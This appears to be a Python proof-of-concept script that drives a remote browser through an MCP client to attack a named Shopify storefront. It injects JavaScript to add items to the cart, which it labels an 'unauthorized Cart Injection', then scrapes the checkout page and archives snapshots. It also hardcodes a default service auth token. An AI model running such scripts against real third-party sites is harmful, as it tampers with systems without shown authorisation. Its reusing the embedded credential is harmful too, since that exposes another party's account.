import asyncio
import os
import json
import sys
from datetime import datetime, timezone
from mcp import ClientSession
from mcp.client.sse import sse_client

TOKEN = os.getenv("PHANTOM_AUTH_TOKEN", "D2aZuYtdGL6tUfuV2egoxp")
SSE_URL = f"https://phantom-cloud-engine.fly.dev/sse/?token={TOKEN}"
TARGET_URL = "https://funk-it-up-sdzgxmea.myshopify.com/"

async def execute_vector2():
    utc_now = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    out_dir = f"runs/vector2_injection_{utc_now}"
    os.makedirs(out_dir, exist_ok=True)

    print(f"Establishing air-gapped MCP connection to {SSE_URL[:45]}...")
    async with sse_client(SSE_URL) as streams:
        async with ClientSession(streams[0], streams[1]) as session:
            await session.initialize()

            print("1. Routing to storefront boundary...")
            await session.call_tool("navigate", {"url": TARGET_URL})
            await session.call_tool("wait", {"delay_ms": 4000})

            print("2. Executing unauthorized Cart Injection (Vector 2)...")
            injection_js = """
            fetch('/cart/add.js', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ items: [{ id: 50535758364858, quantity: 1 }, { id: 50535758266554, quantity: 1 }] })
            }).then(res => res.json()).then(data => JSON.stringify(data))
            """
            res = await session.call_tool("evaluate", {"expression": injection_js})
            print(f"Injection Payload Response:\n{res.content[0].text[:500]}\n")

            print("3. Pivoting to /checkout to crystallize the PoC...")
            await session.call_tool("navigate", {"url": f"{TARGET_URL}checkout"})
            await session.call_tool("wait", {"delay_ms": 6000})

            print("4. Extracting Checkout Telemetry...")
            poc_js = """
            JSON.stringify({
                href: location.href,
                title: document.title,
                checkout_items: Array.from(document.querySelectorAll('.product-table, [role="table"], .order-summary, .product')).map(e => e.innerText.replace(/\\s+/g, ' ').trim())
            })
            """
            poc_res = await session.call_tool("evaluate", {"expression": poc_js})
            print(f"Checkout State:\n{poc_res.content[0].text[:500]}\n")

            snap = await session.call_tool("get_snapshot", {"mode": "html"})
            with open(f"{out_dir}/html_snapshot.txt", "w") as f:
                f.write(snap.content[0].text)

            with open(f"{out_dir}/evaluate.json", "w") as f:
                f.write(poc_res.content[0].text)

            print(f"Vector 2 PoC and Telemetry archived in {out_dir}")

if __name__ == "__main__":
    asyncio.run(execute_vector2())
